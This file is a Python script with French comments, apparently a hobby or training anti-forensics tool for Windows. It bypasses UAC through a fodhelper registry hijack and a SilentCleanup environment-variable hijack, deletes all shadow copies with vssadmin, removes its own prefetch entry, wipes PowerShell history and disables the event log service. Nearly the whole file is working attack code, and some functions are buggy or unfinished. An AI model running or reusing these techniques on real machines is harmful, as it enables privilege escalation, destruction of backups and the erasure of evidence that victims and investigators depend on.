import os
import time
import sys
import re
import pyfiglet
"""
A faire : 
Delete le prefetch
Supprimer les shadow copies
Delete l'exe
clear des logs windows ==> wevtutil cl system ; wevtutil cl application ; wevtutil cl security
delete les fichiers qui pourraient etre créé (Secure Delete) ==> Voir Sdelete
Delete les commandes powershell => Clear-History && C:\\Users\\Clément\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
"""
try:
	ascii_banner = pyfiglet.figlet_format("LET'S  HACK \n")
	print(ascii_banner)
except:
	pass


file = sys.argv[0].upper()
#print(f"This is the name of the script: {file}")
#Ici on récupère le nom de l'exe, meme si le nom a été changé on pourra quand meme retrouver le prefetch
len_path = len(os.getcwd())
#print(len_path)
len_file = len(file)
#print(len_file)
len_path_file = len_file - len_path -1
#Permet d'enlever le /
#print(len_path_file)
print(file[-len_path_file:])
#print(file[:len_file])
#print(file[-len_file:])


	# La variable "cmd" etant celle passée en argument il faut la changer selon ce qu'il est demandé de faire
def bypass_uac_1():
	# La variable "cmd" etant celle passée en argument il faut la changer selon ce qu'il est demandé de faire
	cmd = f"C:\Windows\System32\cmd.exe /k powershell.exe Set-Itemproperty -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -value '0'"
	try:
		#Ajouter une possibilité pour changer une clé de registre
		os.system(f'reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d "{cmd}" /f')
		os.system('reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f')
		os.popen('fodhelper.exe')
		time.sleep(10)
		os.system('reg delete "HKCU\Software\Classes\.thm\" /f')
		os.system('reg delete "HKCU\Software\Classes\ms-settings\" /f')
	except:
		pass


def bypass_uac_2():
	#Necessite AV désactivé
	cmd = "C:\Windows\System32\cmd.exe &REM"
	os.system(f'reg add "HKCU\Environment" /v "windir" /d "{cmd}" /f') #On réécrit la variable d'env windir
	os.system('schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I')
	#Voir DLL hijack pour une meilleure réussite car flag par windows defender

def detect_uac():
	global bypass_uac
	try:
		username = os.environ['username']
		stream = os.popen(f'net user {username} | findstr Admin')
		output = stream.read()
		if len(output) != 0: #Si réponse alors il fait parti du grp admin
			print("Yeah Admin")
			get_uac = os.popen('powershell.exe (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA') 
			output_uac = get_uac.read()
			output_uac = int(output_uac)
			if output_uac == 1: #Regarde si UAC est activé
				print("UAC is enabled")
				#On veut connaitre le niveau de l'UAC
				uac_value = os.popen('powershell.exe (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin')
				output_uac_value = uac_value.read()
				output_uac_value = int(output_uac_value)
				print(output_uac_value)
				if output_uac_value == 2:
					bypass_uac = False
				elif output_uac_value == 0: 
					bypass_uac = True
				else:
					bypass_uac_1()
					bypass_uac = True

			else:
				print("UAC not enabled\n no need to bypass")
			
		else:
			bypass_uac = False
			print("Not admin :/")
			
	except:
		quit()
	

def delete_prefetch():
	windows = os.environ['WINDIR'] + "\Prefetch"
	#time.sleep(15)
	#On attend 15 secondes le temps que le prefetch se créer.
	try:
		#dir C:\Windows\Prefetch
		#Permet de lister les prefetch
		prefetch_files = os.listdir(windows)
		for pf_file in prefetch_files:
		    if pf_file[:len_path_file] == file[-len_path_file:]:
		    	print("File found :" + pf_file)
		    	print(windows + "\\" + pf_file)
		    	try:
		    		os.remove(windows + "\\" + pf_file)
		    		print("Successfully deleted")
		    	except:
		    		print("Impossible to delete file")
		    	break
	except OSError as e:
		print(f"Os Error:{e}")


#Pour les VSS avec le cmd vssadmin List Shadows 
# Voir https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html#:~:text=Your%20shadow%20copies%20are%20generally,folder%20(hidden%20by%20default).
#Il faut etre admin

#os.system('vssadmin List Shadows')
def vss():
	
	try:
		volume = os.environ['SystemDrive']
		commande = f'vssadmin delete shadows /for={volume} /all /quiet'
		os.popen(f"powershell \"Start-Process powershell -Verb runas '{commande}'")

	except Exception as e:
		print(e)
		pass


def powershell_history():
	location = os.environ['appdata'] + "\\Microsoft\\Windows\\PowerShell\\PSReadline"
	try:
		os.popen('powershell.exe Clear-History')
		os.remove(location + "\\" + "ConsoleHost_history.txt")
		print("Successfully deleted")
	except:
		print("Le fichier n'existe pas")

def clear_logs():
	commande = f'sc config eventlog start= disabled'
	os.popen("powershell \"Start-Process powershell -Verb runas '{commande}'")
	#sc config eventlog start= disabled
	#wevtutil cl system ; wevtutil cl application ; wevtutil cl security


def main():
	detect_uac()
	os.popen("powershell \"Start-Process powershell -Verb runas 'taskkill /F /IM cmd.exe'\"")
	if bypass_uac:
		"""
		clear_log()
		delete_prefetch()
		"""
		vss()
	powershell_history()
	test = input("Tapes sur  Enter ...")

main()
#Pour lister les répertoire et les envoyer
#dir /path/ >> %temp%/nom.txt